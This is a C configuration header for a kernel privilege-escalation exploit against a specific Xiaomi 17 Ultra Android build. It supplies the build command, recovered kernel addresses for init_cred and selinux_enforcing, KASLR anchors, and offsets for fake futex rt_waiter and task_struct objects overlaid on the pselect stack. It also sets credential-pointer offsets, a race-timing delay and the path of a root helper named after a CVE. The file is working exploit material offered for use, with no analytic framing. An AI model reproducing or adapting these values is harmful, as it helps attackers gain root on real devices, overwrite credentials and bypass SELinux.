#ifndef TARGET_H
#define TARGET_H

/* Xiaomi 17 Ultra (nezha) — HyperOS OS3.0.10.0.WPACNXM (CN), Qualcomm SM8850
 *
 *   kernel 6.12.23-android16-5-g75e9b1c7ae7c-abogki463945075-4k (GKI, 4K pages)
 *   build  Xiaomi/nezha/nezha:16/BP2A.250605.031.A3/OS3.0.10.0.WPACNXM:user/release-keys
 *
 * Build with:
 *   make TARGET=nezha/cn/6.12.23-android16-5-g75e9b1c7ae7c-abogki463945075-4k
 *
 * This is a 6.12 kernel, so it uses core612. The values in the recovered
 * block below come from the exact nezha stock boot image and its running
 * /proc metadata; they are not borrowed from a different Xiaomi target.
 */

/* --- recovered: exact nezha stock boot image ---------------------------- */

/* target profile */
#define KIMAGE_TEXT_BASE 0xffffffc080000000ULL
#define P0_PAGE_OFFSET 0xffffff8000000000ULL
#define P0_PHYS_OFFSET 0x80000000ULL
#define P0_KERNEL_PHYS_LOAD 0xc7800000ULL

/*
 * __arm64_sys_futex (0x70) + do_futex (0x60) + futex_wait_requeue_pi
 * (0x1c0) place rt_waiter at syscall-entry-SP - 0x1f0. The pselect path
 * (__arm64_sys_pselect6 0x90 + core_sys_select 0x1b0) places stack_fds at
 * syscall-entry-SP - 0x200, so the stale waiter begins at stack_fds word 2.
 */
#define PSELECT_WAITER_WORD_SHIFT 2

/* kernel image addresses */
#define INIT_TASK 0xffffffc0823fcf00ULL
#define INIT_CRED 0xffffffc082412a68ULL
#define ENTRY_TASK 0xffffffc0823a2400ULL
#define PER_CPU_OFFSET 0xffffffc0823eb810ULL
#define ROOT_TASK_GROUP 0xffffffc08262e580ULL
#define SELINUX_ENFORCING 0xffffffc08267a5b8ULL

/* KASLR anchors */
#define SLIDE_NFULNL_LOGGER_IMAGE 0xffffffc0823f21b0ULL
#define SLIDE_LOGGERS_0_1_IMAGE 0xffffffc0823f20f0ULL
#define SLIDE_RANDOM_BOOT_ID_DATA_IMAGE 0xffffffc08269b968ULL
#define SLIDE_INIT_TASK_IMAGE 0xffffffc0823fcf00ULL
#define SLIDE_ROOT_TASK_GROUP_IMAGE 0xffffffc08262e580ULL

/* waiter and fake task fields */
#define WAITER_TREE_ENTRY_OFF 0x0
#define WAITER_PI_TREE_ENTRY_OFF 0x28
#define WAITER_TASK_OFF 0x50
#define WAITER_LOCK_OFF 0x58
#define WAITER_WAKE_STATE_OFF 0x60
#define WAITER_PRIO_OFF 0x18
#define WAITER_DEADLINE_OFF 0x20
#define WAITER_WW_CTX_OFF 0x68
#define FAKE_WAITER_TREE_PRIO_OFF 0x18
#define FAKE_WAITER_TREE_DEADLINE_OFF 0x20
#define FAKE_WAITER_PI_TREE_ENTRY_OFF 0x28
#define FAKE_WAITER_PI_TREE_PRIO_OFF 0x40
#define FAKE_WAITER_PI_TREE_DEADLINE_OFF 0x48
#define FAKE_WAITER_TASK_OFF 0x50
#define FAKE_WAITER_LOCK_OFF 0x58
#define FAKE_WAITER_WAKE_STATE_OFF 0x60
#define FAKE_WAITER_WW_CTX_OFF 0x68
#define FAKE_TASK_USAGE_OFF 0x40
#define FAKE_TASK_PRIO_OFF 0x94
#define FAKE_TASK_NORMAL_PRIO_OFF 0x9c
#define FAKE_TASK_TASK_GROUP_OFF 0x420
#define FAKE_TASK_PI_LOCK_OFF 0x9ec
#define FAKE_TASK_PI_WAITERS_OFF 0xa00
#define FAKE_TASK_PI_TOP_TASK_OFF 0xa10
#define FAKE_TASK_PI_BLOCKED_ON_OFF 0xa18
#define FAKE_TASK_UCLAMP_REQ_OFF 0x428
#define FAKE_TASK_UCLAMP_OFF 0x430

/* task credential pointers */
#define TASK_REAL_CRED_OFF 0x8f8
#define TASK_CRED_OFF 0x900

/* --- end recovered ------------------------------------------------------ */

/* Let core612 detect the boot's MTE state at runtime. */

/* Nezha's direct FOPS punch otherwise races ahead of pselect()'s waiter
 * overlay. Keep the imported core's default unchanged for other targets and
 * give this Qualcomm profile the same entry guard already used by its slide
 * route. */
#define PSELECT_FOPS_ENTER_DELAY_USEC 50000

#define ROOT_HELPER_PATH "/data/local/tmp/cve-2026-43499-root"
#define PAYLOAD_ATTEMPT_BUDGET 3
#define PAYLOAD_ATTEMPT_TIMEOUT_SEC 300

#endif
